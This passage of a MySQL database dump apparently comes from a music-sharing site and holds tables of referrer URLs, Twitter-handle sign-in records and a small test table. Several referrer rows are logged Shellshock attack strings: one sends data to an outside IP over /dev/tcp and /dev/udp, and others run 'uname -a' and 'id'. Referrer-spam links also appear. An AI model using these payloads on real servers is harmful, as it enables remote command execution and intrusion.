INSERT INTO `refs` VALUES (249,'https://twitter.com/robinhouston/status/170454977758773248',0,2);
INSERT INTO `refs` VALUES (250,'http://www.facebook.com/l/pAQEXEjWxAQHvlM-7QkHiybh2-fgzl7ZmQICLXDHpscq_jQ/thisismyj.am/',0,1);
INSERT INTO `refs` VALUES (251,'http://t.co/xTwSJ5o9',0,2);
INSERT INTO `refs` VALUES (252,'http://www.facebook.com/l/jAQFAF_d3AQEHm8DMSFgn-3hVEbtNlu-Fnqwwolu39ouK4w/thisismyj.am/',0,1);
INSERT INTO `refs` VALUES (253,'http://t.co/eqdsgYwK',0,1);
INSERT INTO `refs` VALUES (254,'http://t.co/9Xs5uG3S',3,5);
INSERT INTO `refs` VALUES (255,'https://twitter.com/miss_lucifer/status/170646172652937217',3,2);
INSERT INTO `refs` VALUES (256,'https://twitter.com/miss_lucifer/status/170645715213754368',0,1);
INSERT INTO `refs` VALUES (257,'https://twitter.com/patrickhmason/status/172310177285013504',0,1);
INSERT INTO `refs` VALUES (258,'http://t.co/IzKfi3Md',0,1);
INSERT INTO `refs` VALUES (259,'http://t.co/dD4yS1GI',0,9);
INSERT INTO `refs` VALUES (260,'https://twitter.com/incrediblyrich/status/172311657928851457',0,5);
INSERT INTO `refs` VALUES (261,'http://t.co/rQtEwAIs',23,2);
INSERT INTO `refs` VALUES (262,'http://t.co/oBGUN0ye',15,3);
INSERT INTO `refs` VALUES (263,'http://www.exquisitetweets.com/tweets?eids=m2gvgzypAO.m2kTNWQVnp.m2U5XsR1bh.m3ktEEZLHM.m3kXQUSZps.m3mA1KWrm0',0,52);
INSERT INTO `refs` VALUES (264,'http://t.co/wkac9pcu',0,13);
INSERT INTO `refs` VALUES (265,'https://twitter.com/mollerstrand/status/174536656668459008',0,2);
INSERT INTO `refs` VALUES (266,'http://36ohk6dgmcd1n-c.c.yom.mail.yahoo.net/om/api/1.0/openmail.app.invoke/36ohk6dgmcd1n/9/1.0.35/us/en-US/view.html/0',0,1);
INSERT INTO `refs` VALUES (267,'http://t.co/hOGsCqQ7',0,3);
INSERT INTO `refs` VALUES (268,'http://crownjewelcigars.com',0,1);
INSERT INTO `refs` VALUES (269,'https://twitter.com/thisismyjam/status/174273212862046209',0,1);
INSERT INTO `refs` VALUES (270,'http://trunk.ly/',0,1);
INSERT INTO `refs` VALUES (271,'http://pandodaily.com/2012/03/05/this-is-my-jam-share-the-one-song-youre-currently-obsessed-with/',0,60);
INSERT INTO `refs` VALUES (272,'http://j.mp/xUDd5E',21,6);
INSERT INTO `refs` VALUES (273,'https://www.google.com/',0,49);
INSERT INTO `refs` VALUES (274,'https://twitter.com/thisismyjam/status/177707044760064000',0,4);
INSERT INTO `refs` VALUES (275,'https://twitter.com/sebwhite/status/177732783525998592',0,1);
INSERT INTO `refs` VALUES (276,'http://t.co/oT00q7n0',0,15);
INSERT INTO `refs` VALUES (277,'https://twitter.com/dustmop/status/178190410408132608',0,1);
INSERT INTO `refs` VALUES (278,'https://twitter.com/thisismyjam/status/177474202314604545',0,1);
INSERT INTO `refs` VALUES (279,'http://t.co/MKttfslv',0,5);
INSERT INTO `refs` VALUES (280,'https://twitter.com/thisismyjam/status/179928899147415552',0,1);
INSERT INTO `refs` VALUES (281,'http://yandex.ru/yandsearch?text=In+via+Twitter&lr=213',11,1);
INSERT INTO `refs` VALUES (282,'http://t.co/YwTpfmrE',0,12);
INSERT INTO `refs` VALUES (283,'http://yandex.ru/yandsearch?text=In+via+Twitter+to+upload&lr=213',15,2);
INSERT INTO `refs` VALUES (284,'http://t.co/vxaI6hNW',0,11);
INSERT INTO `refs` VALUES (285,'http://kirish.dev3.dev.meebo.com/spacebook/index.py?test=dark_background',0,1);
INSERT INTO `refs` VALUES (286,'http://yandex.ru/yandsearch?text=thisismyj.am&lr=213',0,58);
INSERT INTO `refs` VALUES (287,'http://t.co/uuvq8aoG',0,1);
INSERT INTO `refs` VALUES (288,'http://Thisismyj.am/',0,2);
INSERT INTO `refs` VALUES (289,'http://t.co/fgQNkJ8E',0,16);
INSERT INTO `refs` VALUES (290,'https://twitter.com/tomcoates/status/189951137120661507',0,2);
INSERT INTO `refs` VALUES (291,'http://thisismymarmala.de/',23,1);
INSERT INTO `refs` VALUES (292,'http://thisismymarmala.de/p/23',23,1);
INSERT INTO `refs` VALUES (293,'http://twitter.com/ThisIsMyJam',0,1);
INSERT INTO `refs` VALUES (294,'http://t.co/HTalz8Dq',0,1);
INSERT INTO `refs` VALUES (295,'http://www.google.com',0,21);
INSERT INTO `refs` VALUES (296,'http://t.co/5dp29bOE',0,99);
INSERT INTO `refs` VALUES (297,'https://twitter.com/brad_frost/status/195961138796707841',0,1);
INSERT INTO `refs` VALUES (298,'https://twitter.com/bunch/status/195960703285338112',0,3);
INSERT INTO `refs` VALUES (299,'http://t.co/onyVZNPp',0,1);
INSERT INTO `refs` VALUES (300,'http://yandex.ru/yandsearch?text=www.thisismyj.am&lr=213',0,2);
INSERT INTO `refs` VALUES (301,'http://yandex.ru/yandsearch?text=www.thisismyj.am',0,4);
INSERT INTO `refs` VALUES (302,'http://www.thisismyj.am',0,33);
INSERT INTO `refs` VALUES (303,'http://webchat.freenode.net/',18,1);
INSERT INTO `refs` VALUES (304,'http://t.co/gc60W7Iu',0,8);
INSERT INTO `refs` VALUES (305,'http://yandex.ru/yandsearch?text=In+via+Twitter+to+upload&lr=213',0,1);
INSERT INTO `refs` VALUES (306,'http://t.co/i0YNCW4o',0,2);
INSERT INTO `refs` VALUES (307,'http://www.google.co.uk/search?q=this+is+myj&ie=UTF-8&oe=UTF-8&hl=en-gb&client=safari',0,1);
INSERT INTO `refs` VALUES (308,'http://roundhere.net/',0,22);
INSERT INTO `refs` VALUES (309,'http://roundhere.net/journal/Photo-Hack-Day-SF/',0,28);
INSERT INTO `refs` VALUES (310,'http://m.facebook.com/',0,1);
INSERT INTO `refs` VALUES (311,'http://m.facebook.com/?_rdr',0,1);
INSERT INTO `refs` VALUES (312,'http://yandex.ru/yandsearch?text=thisismymarmala.de&lr=213',0,13);
INSERT INTO `refs` VALUES (313,'http://extrabot.com/help/grityfokafabuhati.htm',0,8);
INSERT INTO `refs` VALUES (314,'http://www.baidu.com',0,8);
INSERT INTO `refs` VALUES (315,'http://roundhere.net/journal/',0,1);
INSERT INTO `refs` VALUES (316,'http://api.twitter.com/1/statuses/show/238592528650219520.json',0,1);
INSERT INTO `refs` VALUES (317,'http://t.co/T36fp85J',0,6);
INSERT INTO `refs` VALUES (318,'http://api.twitter.com/1/statuses/show/240965399120842752.json',0,1);
INSERT INTO `refs` VALUES (319,'http://t.co/VOSxAnPt',0,1);
INSERT INTO `refs` VALUES (320,'http://www.sitedossier.com/site/thisismyj.am',0,4);
INSERT INTO `refs` VALUES (321,'http://domains.checkparams.com/index.php?q=thisismyj.am',0,7);
INSERT INTO `refs` VALUES (322,'http://api.twitter.com/1/statuses/show/251261148828164096.json',0,1);
INSERT INTO `refs` VALUES (323,'http://rebelmouse.com/',0,1);
INSERT INTO `refs` VALUES (324,'http://t.co/cG0qM6Ea',0,4);
INSERT INTO `refs` VALUES (325,'http://t.co/mpA8VI3X',0,5);
INSERT INTO `refs` VALUES (326,'http://domains.checkparams.com/index.php?q=thisismyj.am',5,2);
INSERT INTO `refs` VALUES (327,'http://www.we-globe.net/Weblab/SiteCommonGraveReport/thisismyj.am/',0,1);
INSERT INTO `refs` VALUES (328,'http://www.bing.com',0,6);
INSERT INTO `refs` VALUES (329,'http://t.co/UdcPTU6g',0,14);
INSERT INTO `refs` VALUES (330,'http://bnch.me/JUQzd1',0,1);
INSERT INTO `refs` VALUES (331,'http://www.facebook.com',0,1);
INSERT INTO `refs` VALUES (332,'http://evuln.com/tools/malware-scanner/thisismyj.am/',0,12);
INSERT INTO `refs` VALUES (333,'http://rebelmouse.com/',3,1);
INSERT INTO `refs` VALUES (334,'http://favstar.fm/users/iamcal',0,3);
INSERT INTO `refs` VALUES (335,'http://abtasty.com/',0,4);
INSERT INTO `refs` VALUES (336,'http://www.baidu.com/s?wd=ThisIsMyJam',0,23);
INSERT INTO `refs` VALUES (337,'http://pandodaily.com/2012/03/05/this-is-my-jam-share-the-one-song-youre-currently-obsessed-with/feed/',0,1);
INSERT INTO `refs` VALUES (338,'http://t.co/rteUrq6K',0,4);
INSERT INTO `refs` VALUES (339,'http://sameid.net/domain/thisismyj.am/',0,5);
INSERT INTO `refs` VALUES (340,'http://www.baidu.com/s?wd=ioxmkpgiep&rsv_bp=0&rsv_spt=3',0,1);
INSERT INTO `refs` VALUES (341,'http://client00.chat.mibbit.com/',0,1);
INSERT INTO `refs` VALUES (342,'http://netcomber.com',0,5);
INSERT INTO `refs` VALUES (343,'http://domains.checkparams.com/index.php?q=thisismyj.am',16,1);
INSERT INTO `refs` VALUES (344,'http://api.twitter.com/1/statuses/show/342540319063166978.json',0,1);
INSERT INTO `refs` VALUES (345,'http://google.com',0,6);
INSERT INTO `refs` VALUES (346,'http://t.co/VYMS53Mf09',0,3);
INSERT INTO `refs` VALUES (347,'http://stellar.io/rodbegbie/flow',0,1);
INSERT INTO `refs` VALUES (348,'http://utopic.me/page/110986787_u/thisismyj.am/',0,3);
INSERT INTO `refs` VALUES (349,'http://api.twitter.com/1/statuses/show/347833218638163968.json',0,1);
INSERT INTO `refs` VALUES (350,'http://t.co/DU07nWBNgw',0,2);
INSERT INTO `refs` VALUES (351,'http://indiewebcamp.com/irc/2013-06-23',0,3);
INSERT INTO `refs` VALUES (352,'http://domains.checkparams.com/index.php?q=thisismyj.am',13,1);
INSERT INTO `refs` VALUES (353,'http://www.webwiki.com/thisismyj.am',0,7);
INSERT INTO `refs` VALUES (354,'http://netcomber.com/thisismyj.am?st=br',0,4);
INSERT INTO `refs` VALUES (355,'http://thisismyj.macinroy.com/thisismyj.am',0,6);
INSERT INTO `refs` VALUES (356,'http://maldb.com/thisismyj.am/',4,1);
INSERT INTO `refs` VALUES (357,'http://smeguk.com',0,1);
INSERT INTO `refs` VALUES (358,'http://siteexplorer.info',0,3);
INSERT INTO `refs` VALUES (359,'http://t.co/m0ETx8Kxgr',0,3);
INSERT INTO `refs` VALUES (360,'http://t.co/9m9FDlulm3',0,4);
INSERT INTO `refs` VALUES (361,'http://maldb.com/thisismyj.am/',0,2);
INSERT INTO `refs` VALUES (362,'http://bjmyhk.com',0,1);
INSERT INTO `refs` VALUES (363,'http://beamfall.info/info/grityfokafabuhati',0,5);
INSERT INTO `refs` VALUES (364,'http://www.thisismyj.am/',0,53);
INSERT INTO `refs` VALUES (365,'http://ebainet.com',0,1);
INSERT INTO `refs` VALUES (366,'http://www.webstream.biz',0,1);
INSERT INTO `refs` VALUES (367,'http://thisismyisrael.com/Contests/WG/Default.aspx',0,1);
INSERT INTO `refs` VALUES (373,'http://www.josephthibault.com/tag/patriots/',3,1);
INSERT INTO `refs` VALUES (374,'http://www.520955.com/hougong/268.html',0,1);
INSERT INTO `refs` VALUES (378,'https://duckduckgo.com/',0,2);
INSERT INTO `refs` VALUES (379,'https://m.facebook.com',0,1);
INSERT INTO `refs` VALUES (386,'http://roundhere.net/hacks/player/',0,1);
INSERT INTO `refs` VALUES (388,'https://www.google.co.uk/',0,8);
INSERT INTO `refs` VALUES (390,'http://www.theserviceadvisor.com/searchresults.shtml?PLUCKsearchTerm=car service&PLUCKwhichPage=relatedAdLinks',0,1);
INSERT INTO `refs` VALUES (391,'http://radio.foxnews.com/podcast/',19,1);
INSERT INTO `refs` VALUES (392,'http://kojiiman.info/',0,1);
INSERT INTO `refs` VALUES (394,'http://whois.domaintools.com/thisismymarmala.de',0,56);
INSERT INTO `refs` VALUES (403,'http://www.sunorbit.net/sun_wobble.htm',0,2);
INSERT INTO `refs` VALUES (410,'http://udca.fr/',0,1);
INSERT INTO `refs` VALUES (411,'http://kiwidition-opt.com/',14,1);
INSERT INTO `refs` VALUES (412,'http://saferpage.de/thisismyj.am',0,1);
INSERT INTO `refs` VALUES (422,'http://t.co/NiCN296V62',0,3);
INSERT INTO `refs` VALUES (440,'http://fansgen.de/',0,1);
INSERT INTO `refs` VALUES (445,'http://vidimo.net',0,1);
INSERT INTO `refs` VALUES (453,'http://pando.com/2012/03/05/this-is-my-jam-share-the-one-song-youre-currently-obsessed-with/',0,1);
INSERT INTO `refs` VALUES (456,'http://www.google.com/search',0,2);
INSERT INTO `refs` VALUES (457,'http://yandex.ru/yandsearch?text=this+is+my+jam&lr=213',0,6);
INSERT INTO `refs` VALUES (458,'http://api.twitter.com/1/statuses/show/533792730346831872.json',0,1);
INSERT INTO `refs` VALUES (461,'http://t.co/PMftg4KiOR',0,1);
INSERT INTO `refs` VALUES (463,'http://bluerobot.info/info/grityfokafabuhati',0,3);
INSERT INTO `refs` VALUES (470,'http://yandex.ru/yandsearch?text=tis+is+my+jam&lr=213',0,3);
INSERT INTO `refs` VALUES (474,'https://www.google.ca/',0,9);
INSERT INTO `refs` VALUES (477,'http://buttons-for-website.com',0,86);
INSERT INTO `refs` VALUES (480,'https://www.google.co.nz/',0,1);
INSERT INTO `refs` VALUES (484,'() { :;}; /bin/bash -c \"echo thisismyj.am/ > /dev/tcp/213.233.161.42/23; echo thisismyj.am/ > /dev/udp/213.233.161.42/80\"',0,1);
INSERT INTO `refs` VALUES (493,'http://bluerobot.info/nw2/gripikikyrobuha',0,9);
INSERT INTO `refs` VALUES (511,'http://pizza-tycoon.de/',0,2);
INSERT INTO `refs` VALUES (518,'http://hundejo.com/',0,10);
INSERT INTO `refs` VALUES (519,'http://hvd-store.com/',0,11);
INSERT INTO `refs` VALUES (521,'http://specialdessous.com/',0,2);
INSERT INTO `refs` VALUES (526,'https://www.google.com.mx/',0,2);
INSERT INTO `refs` VALUES (529,'http://burger-imperia.com/',0,37);
INSERT INTO `refs` VALUES (547,'http://buttons-for-your-website.com',0,43);
INSERT INTO `refs` VALUES (590,'http://www.google.com/url?url=thisismyj.am&yahoo.com',0,2);
INSERT INTO `refs` VALUES (591,'http://www.google.com/url?url=thisismyj.am&yahoo.com',4,1);
INSERT INTO `refs` VALUES (598,'http://m.facebook.com',0,1);
INSERT INTO `refs` VALUES (601,'http://www.yougetsignal.com/tools/web-sites-on-web-server/',0,1);
INSERT INTO `refs` VALUES (606,'http://sexe-et-cul-femmes-sodomie.iso754.net/',0,1);
INSERT INTO `refs` VALUES (607,'https://www.salazargardening.com/our-work',14,1);
INSERT INTO `refs` VALUES (618,'http://t.co/4QFs4JfVws',0,4);
INSERT INTO `refs` VALUES (623,'https://www.google.no/',0,2);
INSERT INTO `refs` VALUES (635,'https://envelope.co.jp/index_ja_jpy_8-109.html',0,1);
INSERT INTO `refs` VALUES (636,'https://envelope.co.jp/index_ja_jpy_8-142.html',11,1);
INSERT INTO `refs` VALUES (638,'http://pizza-tycoon.com/',0,7);
INSERT INTO `refs` VALUES (643,'http://semaltmedia.com',0,1);
INSERT INTO `refs` VALUES (647,'() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @',0,5);
INSERT INTO `refs` VALUES (654,'http://videos-for-your-business.com',0,12);
INSERT INTO `refs` VALUES (664,'http://thisismymarmala.de/p/1',1,1);
INSERT INTO `refs` VALUES (665,'https://www.google.de/',0,1);
INSERT INTO `refs` VALUES (708,'http://www.google.com/search?hl=en&q=google&btnG=Google+Search',0,1);
INSERT INTO `refs` VALUES (718,'http://thisismymarmala.de/',7,1);
INSERT INTO `refs` VALUES (730,'http://video--production.com',0,10);
INSERT INTO `refs` VALUES (735,'http://pizza-imperia.com/',0,7);
INSERT INTO `refs` VALUES (775,'() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;id;echo @',0,1);
INSERT INTO `refs` VALUES (779,'http://justprofit.xyz',0,1);
INSERT INTO `refs` VALUES (810,'http://roundhere.net',0,2);
INSERT INTO `refs` VALUES (823,'http://scripted.com/thisismyj.am',0,79);
INSERT INTO `refs` VALUES (888,'<a href=\"http://www.world-of-digital-sound.com/\">www.world-of-digital-sound.com</a>',0,1);
INSERT INTO `refs` VALUES (889,'<a href=\"http://www.digital-audio-forum.com/\">www.digital-audio-forum.com</a>',0,1);
INSERT INTO `refs` VALUES (890,'<a href=\"http://www.digital-video-processing.com/\">www.digital-video-processing.com</a>',0,1);
INSERT INTO `refs` VALUES (891,'<a href=\"http://www.home-theater-equipment.com\">www.home-theater-equipment.com</a>',0,1);
INSERT INTO `refs` VALUES (892,'<a href=\"http://www.la-video-numerique.com/\">www.la-video-numerique.com</a>',0,1);
INSERT INTO `refs` VALUES (896,'http://rbot.info/link/gripikikyrobuny',0,1);
INSERT INTO `refs` VALUES (897,'http://rbot.info/link/gripikikyrobuha',0,2);
INSERT INTO `refs` VALUES (898,'<a href=\"http://www.all-digital-sound.com/\">www.all-digital-sound.com</a>',0,1);
INSERT INTO `refs` VALUES (899,'<a href=\"http://www.digital-audio-talks.com/\">www.digital-audio-talks.com</a>',0,1);
INSERT INTO `refs` VALUES (900,'<a href=\"http://www.about-digital-photo.com/\">www.about-digital-photo.com</a>',0,1);
INSERT INTO `refs` VALUES (902,'<a href=\"http://finrus.club/\">finrus.club</a>',0,1);
INSERT INTO `refs` VALUES (903,'<a href=\"http://www.choose-audio-equipment.com/\">www.choose-audio-equipment.com</a>',0,1);
INSERT INTO `refs` VALUES (926,'http://m.baidu.com/s?wd=ThisIsMyJam',0,2);
INSERT INTO `refs` VALUES (931,'http://uptimechecker.com/thisismyj.am',0,2);
INSERT INTO `refs` VALUES (935,'http://uptimebot.net/thisismyj.am',0,2);
INSERT INTO `refs` VALUES (951,'https://t.co/ZXbGFSKY',0,1);
INSERT INTO `refs` VALUES (952,'http://amsterjob.com',0,3);
INSERT INTO `refs` VALUES (956,'http://amsterjob.com',21,1);
INSERT INTO `refs` VALUES (985,'http://rbot.info/link/gripikikyronuku',0,1);
INSERT INTO `refs` VALUES (988,'http://uptime.com/thisismyj.am',0,70);
INSERT INTO `refs` VALUES (1017,'thisismyj.am',0,1);
/*!40000 ALTER TABLE `refs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `signins`
--

DROP TABLE IF EXISTS `signins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `signins` (
  `user` varchar(255) NOT NULL,
  `num` int(10) unsigned NOT NULL,
  `last_date` int(10) unsigned NOT NULL,
  PRIMARY KEY (`user`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `signins`
--

LOCK TABLES `signins` WRITE;
/*!40000 ALTER TABLE `signins` DISABLE KEYS */;
INSERT INTO `signins` VALUES ('aj_187',2,1328842989);
INSERT INTO `signins` VALUES ('akurjata',1,1329202427);
INSERT INTO `signins` VALUES ('aleksk',2,1329001812);
INSERT INTO `signins` VALUES ('alexknowshtml',2,1334794563);
INSERT INTO `signins` VALUES ('alirayl',1,1354204207);
INSERT INTO `signins` VALUES ('anchorend',1,1354287192);
INSERT INTO `signins` VALUES ('anildash',1,1322289029);
INSERT INTO `signins` VALUES ('annehyphenfay',1,1334130515);
INSERT INTO `signins` VALUES ('anno',1,1322615735);
INSERT INTO `signins` VALUES ('apgwoz',1,1328839138);
INSERT INTO `signins` VALUES ('arielwaldman',1,1322287158);
INSERT INTO `signins` VALUES ('aweissman',1,1322307521);
INSERT INTO `signins` VALUES ('bencochran',1,1333656131);
INSERT INTO `signins` VALUES ('BenWard',1,1322285081);
INSERT INTO `signins` VALUES ('bevan7',1,1326305970);
INSERT INTO `signins` VALUES ('blech',1,1322463296);
INSERT INTO `signins` VALUES ('blweiner',1,1322296502);
INSERT INTO `signins` VALUES ('brokenbottleboy',1,1324597710);
INSERT INTO `signins` VALUES ('bunch',3,1335555369);
INSERT INTO `signins` VALUES ('callumjoynes',2,1328877732);
INSERT INTO `signins` VALUES ('chrrr',1,1324115194);
INSERT INTO `signins` VALUES ('cjmartin',1,1322312895);
INSERT INTO `signins` VALUES ('contemptslot',1,1349812362);
INSERT INTO `signins` VALUES ('Copelandic',1,1348759414);
INSERT INTO `signins` VALUES ('couch',1,1322283799);
INSERT INTO `signins` VALUES ('cthulahoop',1,1358498426);
INSERT INTO `signins` VALUES ('davidhughes',1,1332861433);
INSERT INTO `signins` VALUES ('ddinch',1,1332454373);
INSERT INTO `signins` VALUES ('deflatermouse',1,1323895216);
INSERT INTO `signins` VALUES ('dominicsayers',1,1322605314);
INSERT INTO `signins` VALUES ('dorywithserifs',1,1322319111);
INSERT INTO `signins` VALUES ('Douglas_LeTard',1,1363217784);
INSERT INTO `signins` VALUES ('dozens',1,1322419756);
INSERT INTO `signins` VALUES ('d_castillo',1,1361471612);
INSERT INTO `signins` VALUES ('Emmachinn',1,1346057417);
INSERT INTO `signins` VALUES ('Ernie_Johnson',1,1367719549);
INSERT INTO `signins` VALUES ('ernmalleyscat',2,1326276694);
INSERT INTO `signins` VALUES ('frederikdanvig',1,1331067462);
INSERT INTO `signins` VALUES ('GaganMoorthy',1,1338000223);
INSERT INTO `signins` VALUES ('ganss',1,1322289980);
INSERT INTO `signins` VALUES ('garannm',1,1324944608);
INSERT INTO `signins` VALUES ('gideonb',1,1322304397);
INSERT INTO `signins` VALUES ('hanonno',1,1326890360);
INSERT INTO `signins` VALUES ('helloimfreddie',1,1363482633);
INSERT INTO `signins` VALUES ('holloway',1,1364411899);
INSERT INTO `signins` VALUES ('HURGHT',1,1326170464);
INSERT INTO `signins` VALUES ('iaboyeji',1,1331048344);
INSERT INTO `signins` VALUES ('iamcal',7,1323473688);
INSERT INTO `signins` VALUES ('iamtomwhite',2,1327933535);
INSERT INTO `signins` VALUES ('iano',1,1331238864);
INSERT INTO `signins` VALUES ('iNerdier',1,1357327027);
INSERT INTO `signins` VALUES ('introvertial',1,1322375504);
INSERT INTO `signins` VALUES ('ItJustBroke',2,1359021961);
INSERT INTO `signins` VALUES ('itschrisburton',1,1335904497);
INSERT INTO `signins` VALUES ('jacknswain',1,1331204052);
INSERT INTO `signins` VALUES ('jaytay',1,1345813238);
INSERT INTO `signins` VALUES ('jennjenn',1,1330729453);
INSERT INTO `signins` VALUES ('jim_obelisk',1,1322410434);
INSERT INTO `signins` VALUES ('joeshivers',1,1325687314);
INSERT INTO `signins` VALUES ('joe_schott',1,1332971000);
INSERT INTO `signins` VALUES ('johntucker',1,1322525368);
INSERT INTO `signins` VALUES ('jonty',1,1322485203);
INSERT INTO `signins` VALUES ('jwheare',2,1322416008);
INSERT INTO `signins` VALUES ('k',1,1334124544);
INSERT INTO `signins` VALUES ('kb',1,1323129647);
INSERT INTO `signins` VALUES ('kentbrew',1,1322285981);
INSERT INTO `signins` VALUES ('kevinmarks',2,1331028954);
INSERT INTO `signins` VALUES ('khmer_luge',1,1326988404);
INSERT INTO `signins` VALUES ('KojiroMusashi',1,1344812013);
INSERT INTO `signins` VALUES ('krankenhosen',1,1337045247);
INSERT INTO `signins` VALUES ('liquidx',1,1322623926);
INSERT INTO `signins` VALUES ('manuel_svay',2,1322522050);
INSERT INTO `signins` VALUES ('marcuswhitney',1,1324674244);
INSERT INTO `signins` VALUES ('mattrobs',1,1351995145);
INSERT INTO `signins` VALUES ('maxfell',1,1340192390);
INSERT INTO `signins` VALUES ('meanlumberjack',1,1322421328);
INSERT INTO `signins` VALUES ('Miss_Lucifer',1,1329239557);
INSERT INTO `signins` VALUES ('monisaurus',1,1322533018);
INSERT INTO `signins` VALUES ('morcupine',1,1336440781);
INSERT INTO `signins` VALUES ('Myles',1,1322329963);
INSERT INTO `signins` VALUES ('mysterycommand',1,1322352860);
INSERT INTO `signins` VALUES ('natebishop',1,1326805364);
INSERT INTO `signins` VALUES ('nickd',1,1322684115);
INSERT INTO `signins` VALUES ('njba',1,1328084137);
INSERT INTO `signins` VALUES ('novemberborn',1,1324288294);
INSERT INTO `signins` VALUES ('ojtwisted',1,1361124949);
INSERT INTO `signins` VALUES ('osmond',1,1335557409);
INSERT INTO `signins` VALUES ('pattonpending',1,1327034974);
INSERT INTO `signins` VALUES ('ph',1,1322282538);
INSERT INTO `signins` VALUES ('pizzaboyfriend',1,1352490726);
INSERT INTO `signins` VALUES ('PRDH',1,1352894533);
INSERT INTO `signins` VALUES ('pyrhho',1,1342300130);
INSERT INTO `signins` VALUES ('Racheaissance',1,1324507133);
INSERT INTO `signins` VALUES ('revdancatt',1,1322406857);
INSERT INTO `signins` VALUES ('rmetzler',1,1322483225);
INSERT INTO `signins` VALUES ('robertljones',1,1322356006);
INSERT INTO `signins` VALUES ('RodBegbie',1,1322350588);
INSERT INTO `signins` VALUES ('russx2',1,1322486272);
INSERT INTO `signins` VALUES ('ryanchris',1,1322295456);
INSERT INTO `signins` VALUES ('samuelclay',1,1322764434);
INSERT INTO `signins` VALUES ('SirBleedsalot',1,1329276910);
INSERT INTO `signins` VALUES ('skadonk',1,1340821063);
INSERT INTO `signins` VALUES ('skimbrel',1,1322287046);
INSERT INTO `signins` VALUES ('stellaroyale',1,1331311393);
INSERT INTO `signins` VALUES ('superyesok',2,1356753032);
INSERT INTO `signins` VALUES ('tangentialism',1,1324615776);
INSERT INTO `signins` VALUES ('teacup',1,1322302738);
INSERT INTO `signins` VALUES ('therealadam',1,1322326043);
INSERT INTO `signins` VALUES ('ThingInABook',1,1331208073);
INSERT INTO `signins` VALUES ('tmwsiy',1,1334709494);
INSERT INTO `signins` VALUES ('tolar',1,1335199233);
INSERT INTO `signins` VALUES ('tomcoates',1,1322290247);
INSERT INTO `signins` VALUES ('TTables',1,1330417472);
INSERT INTO `signins` VALUES ('vittorioe',1,1349808814);
INSERT INTO `signins` VALUES ('whoisrlg',1,1338598408);
/*!40000 ALTER TABLE `signins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `test`
--

DROP TABLE IF EXISTS `test`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `test` (
  `item_id` int(11) NOT NULL,
  `times_seen` int(11) NOT NULL,
  PRIMARY KEY (`item_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `test`
--

LOCK TABLES `test` WRITE;
/*!40000 ALTER TABLE `test` DISABLE KEYS */;
INSERT INTO `test` VALUES (1,5);
INSERT INTO `test` VALUES (2,10);
/*!40000 ALTER TABLE `test` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed
